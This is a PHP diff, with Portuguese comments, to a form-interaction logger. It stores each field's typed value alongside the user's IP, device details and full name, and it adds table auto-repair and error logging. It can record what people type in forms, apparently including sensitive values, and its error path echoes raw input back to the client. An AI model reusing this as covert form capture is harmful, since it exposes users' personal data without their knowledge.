@@ -18,6 +18,68 @@ header('Expires: 0');
 
 require_once 'db_connect.php';
 
+// Função de log local (caso helpers não esteja carregado)
+if (!function_exists('logError')) {
+    function logError($message, $type = 'ERROR') {
+        $logFile = __DIR__ . '/error.log';
+        $timestamp = date('Y-m-d H:i:s');
+        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+        $logMessage = "[$timestamp] [$type] [IP: $ip] [log_interaction.php] $message" . PHP_EOL;
+        file_put_contents($logFile, $logMessage, FILE_APPEND | LOCK_EX);
+    }
+}
+
+// =============================================
+// AUTO-REPARO: Garantir que a tabela existe e tem todas as colunas
+// =============================================
+function ensureTableStructure($pdo) {
+    try {
+        // 1. Criar tabela se não existir
+        $pdo->exec("
+            CREATE TABLE IF NOT EXISTS `form_interactions` (
+                `id` INT AUTO_INCREMENT PRIMARY KEY,
+                `session_id` VARCHAR(255) NOT NULL,
+                `ip` VARCHAR(45) NOT NULL,
+                `user_agent` TEXT,
+                `browser` VARCHAR(100),
+                `os` VARCHAR(100),
+                `device` VARCHAR(50),
+                `nome_completo` VARCHAR(255) DEFAULT NULL,
+                `ultimo_campo` VARCHAR(100),
+                `acao` VARCHAR(50),
+                `valor_campo` TEXT,
+                `timestamp` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                INDEX `idx_session` (`session_id`),
+                INDEX `idx_ip` (`ip`),
+                INDEX `idx_timestamp` (`timestamp`),
+                INDEX `idx_device` (`device`)
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+        ");
+
+        // 2. Verificar e adicionar coluna user_agent se não existir
+        $stmt = $pdo->prepare("
+            SELECT COUNT(*) as count 
+            FROM information_schema.columns 
+            WHERE table_schema = DATABASE() 
+            AND table_name = 'form_interactions' 
+            AND column_name = 'user_agent'
+        ");
+        $stmt->execute();
+        if ($stmt->fetch()['count'] == 0) {
+            $pdo->exec("ALTER TABLE `form_interactions` ADD COLUMN `user_agent` TEXT AFTER `ip`");
+            logError("Auto-reparo: coluna 'user_agent' adicionada à tabela form_interactions", 'INFO');
+        }
+
+        return true;
+    } catch (Exception $e) {
+        logError("Auto-reparo falhou: " . $e->getMessage());
+        return false;
+    }
+}
+
+// Executar auto-reparo ao carregar
+ensureTableStructure($pdo);
+
 // Função para detectar navegador
 function detectBrowser($userAgent) {
     if (strpos($userAgent, 'Firefox') !== false) return 'Firefox';
@@ -56,7 +118,7 @@ try {
     $data = json_decode($input, true);
 
     if (!$data || !isset($data['interactions'])) {
-        throw new Exception('Dados inválidos');
+        throw new Exception('Dados inválidos recebidos. Input: ' . substr($input, 0, 200));
     }
 
     $interactions = $data['interactions'];
@@ -78,32 +140,38 @@ try {
     ");
 
     $insertedCount = 0;
+    $errors = [];
 
     foreach ($interactions as $interaction) {
-        $sessionId = $interaction['sessionId'] ?? 'unknown';
-        $fieldLabel = $interaction['fieldLabel'] ?? $interaction['fieldName'] ?? 'unknown';
-        $action = $interaction['action'] ?? 'unknown';
-        $fieldValue = $interaction['fieldValue'] ?? '';
-        $timestamp = $interaction['timestamp'] ?? date('Y-m-d H:i:s');
+        try {
+            $sessionId = $interaction['sessionId'] ?? 'unknown';
+            $fieldLabel = $interaction['fieldLabel'] ?? $interaction['fieldName'] ?? 'unknown';
+            $action = $interaction['action'] ?? 'unknown';
+            $fieldValue = $interaction['fieldValue'] ?? '';
+            $timestamp = $interaction['timestamp'] ?? date('Y-m-d H:i:s');
 
-        // Converter timestamp ISO para MySQL datetime
-        $timestamp = date('Y-m-d H:i:s', strtotime($timestamp));
+            // Converter timestamp ISO para MySQL datetime
+            $timestamp = date('Y-m-d H:i:s', strtotime($timestamp));
 
-        $stmt->execute([
-            $sessionId,
-            $ip,
-            $userAgent,
-            $browser,
-            $os,
-            $device,
-            $userName,
-            $fieldLabel,
-            $action,
-            $fieldValue,
-            $timestamp
-        ]);
+            $stmt->execute([
+                $sessionId,
+                $ip,
+                $userAgent,
+                $browser,
+                $os,
+                $device,
+                $userName,
+                $fieldLabel,
+                $action,
+                $fieldValue,
+                $timestamp
+            ]);
 
-        $insertedCount++;
+            $insertedCount++;
+        } catch (Exception $rowError) {
+            $errors[] = "Erro na interação '{$action}': " . $rowError->getMessage();
+            logError("Erro ao inserir interação (acao={$action}): " . $rowError->getMessage());
+        }
     }
 
     // Limpar qualquer conteúdo no buffer antes de enviar JSON
@@ -111,17 +179,27 @@ try {
         ob_end_clean();
     }
 
-    echo json_encode([
-        'success' => true,
+    $response = [
+        'success' => $insertedCount > 0,
         'message' => "$insertedCount interações registradas com sucesso",
         'inserted' => $insertedCount
-    ]);
+    ];
+
+    if (!empty($errors)) {
+        $response['errors'] = $errors;
+        logError("Interações com erros: " . count($errors) . " de " . count($interactions));
+    }
+
+    echo json_encode($response);
 
 } catch (Exception $e) {
     // Limpar buffer antes de enviar erro
     while (ob_get_level()) {
         ob_end_clean();
     }
+    
+    logError("ERRO GERAL: " . $e->getMessage());
+    
     http_response_code(400);
     echo json_encode([
         'success' => false,
